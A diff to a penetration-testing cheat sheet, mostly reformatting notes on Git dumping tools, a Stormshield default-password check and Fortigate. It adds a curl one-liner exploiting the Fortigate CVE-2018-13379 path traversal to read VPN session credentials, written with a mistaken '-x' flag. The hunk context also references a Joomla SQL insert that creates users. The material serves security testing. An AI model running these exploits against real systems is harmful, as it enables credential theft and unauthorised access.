@@ -114,6 +114,7 @@ creer new users INSERT INTO jos_users (name, username, password, usertype, gid, 
 - [React Developer Tools](https://addons.mozilla.org/fr/firefox/addon/react-devtools/) (edit props/state/hooks values)
 
 Security Testers: Inject JavaScript and JSON wherever you can and see what happens. 
+
 Developers: Don’t ever `useeval()` or `dangerouslySetInnerHTML`. Avoid parsing user-supplied JSON.
 
 ---
@@ -143,9 +144,10 @@ ckfinder/ckfinder.html
 
 ## **Git**
 
+- [GitTools Dumper](https://github.com/internetwache/GitTools/tree/master/Dumper)
+- [git-dumper](https://github.com/arthaud/git-dumper)
+
 ```bash
-https://github.com/internetwache/GitTools/tree/master/Dumper
-https://github.com/arthaud/git-dumper
 run script post-merge https://docs.gitlab.com/ee/administration/custom_hooks.html  .git/hooks
 ```
 
@@ -155,17 +157,20 @@ run script post-merge https://docs.gitlab.com/ee/administration/custom_hooks.htm
 
 * TCP PORT 1300
 
-[https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI\_Serverd\_Commands\_reference\_Guide\_v3/Introduction.htm](https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI_Serverd_Commands_reference_Guide_v3/Introduction.htm)
-
+[Stormshield Documentation](https://documentation.stormshield.eu/SNS/v3/fr/Content/CLI_Serverd_Commands_reference_Guide_v3/Introduction.htm)
+```text
 Check default password : \(UpdatePasswd=1 if factory password, 0 if the password already have been changed\) CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0
+```
 
 ---
 
 ## **Fortigate**
 
-```bash
-/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
-```
+- [CVE-2018-13379](https://www.exploit-db.com/exploits/47288)
+
+ ```bash
+ curl -x GET <target>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+ ```
 
 ---
 
